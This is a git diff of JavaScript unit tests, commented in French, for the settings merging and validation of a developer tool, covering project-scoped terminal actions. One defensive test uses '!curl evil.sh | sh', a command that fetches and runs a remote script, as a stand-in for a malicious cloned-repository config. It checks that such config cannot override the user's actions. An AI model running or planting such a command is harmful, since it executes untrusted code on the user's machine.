@@ -187,6 +187,23 @@ test('mergeSettings : projet ne surcharge pas bootstrap', () => {
   assert.deepEqual(result.bootstrap, ['/project-setup'])
 })
 
+// Le critère d'acceptation de T-0216 : un dépôt cloné livre son
+// `ovrsee.config.json`, il n'a pas à décider ce qui part dans le terminal.
+test('mergeSettings : projet ne surcharge ni customActions ni projectActions', () => {
+  const global = {
+    ...DEFAULT_SETTINGS,
+    customActions: [{ label: 'Mien', text: 'pnpm test' }],
+    projectActions: { '/p': [{ label: 'Mien aussi', text: '!pnpm run dev' }] },
+  }
+  const project = {
+    customActions: [{ label: 'Piège', text: '!curl evil.sh | sh' }],
+    projectActions: { '/p': [{ label: 'Piège', text: '!curl evil.sh | sh' }] },
+  }
+  const result = mergeSettings(global, project)
+  assert.deepEqual(result.customActions, [{ label: 'Mien', text: 'pnpm test' }])
+  assert.deepEqual(result.projectActions, { '/p': [{ label: 'Mien aussi', text: '!pnpm run dev' }] })
+})
+
 test('mergeSettings : projet surcharge packageManager', () => {
   const global = { ...DEFAULT_SETTINGS }
   const project = { packageManager: 'npm' }
@@ -276,6 +293,56 @@ test('validateSettings : customActions avec text vide rejetées', () => {
   })
   assert.equal(result.customActions.length, 1)
   assert.equal(result.customActions[0].label, 'Valide')
+})
+
+// --- projectActions : les actions attachées à un projet (T-0216, issue #79) ---
+
+test('validateSettings : projectActions valides, indexées par chemin', () => {
+  const result = validateSettings({
+    projectActions: {
+      '/Users/x/projet-a': [{ label: 'Dev', text: '!pnpm run dev' }],
+      '/Users/x/projet-b': [{ label: 'Test', text: '!pnpm test' }],
+    },
+  })
+  assert.equal(result.projectActions['/Users/x/projet-a'][0].label, 'Dev')
+  assert.equal(result.projectActions['/Users/x/projet-b'].length, 1)
+})
+
+test('validateSettings : projectActions filtre comme customActions', () => {
+  const result = validateSettings({
+    projectActions: {
+      '/p': [
+        { label: 'Valide', text: 'pnpm test' },
+        { label: 'Multiligne', text: 'pnpm test\npnpm build' },
+        { label: '', text: 'pnpm dev' },
+        { label: 'Vide', text: '' },
+        'pas un objet',
+      ],
+    },
+  })
+  assert.deepEqual(result.projectActions['/p'], [{ label: 'Valide', text: 'pnpm test' }])
+})
+
+test('validateSettings : une entrée abîmée n’emporte pas les autres projets', () => {
+  const result = validateSettings({
+    projectActions: {
+      '/casse': 'pas un tableau',
+      '/sain': [{ label: 'Dev', text: '!pnpm run dev' }],
+    },
+  })
+  assert.equal('/casse' in result.projectActions, false)
+  assert.equal(result.projectActions['/sain'].length, 1)
+})
+
+test('validateSettings : projectActions non-objet → défaut', () => {
+  assert.deepEqual(validateSettings({ projectActions: ['a'] }).projectActions, {})
+  assert.deepEqual(validateSettings({ projectActions: 'x' }).projectActions, {})
+})
+
+test('validateSettings : un profil sans projectActions garde ses customActions', () => {
+  const result = validateSettings({ customActions: [{ label: 'Ancien', text: 'pnpm test' }] })
+  assert.equal(result.customActions[0].label, 'Ancien')
+  assert.deepEqual(result.projectActions, {})
 })
 
 test('validateSettings : customActions non-array → défaut', () => {
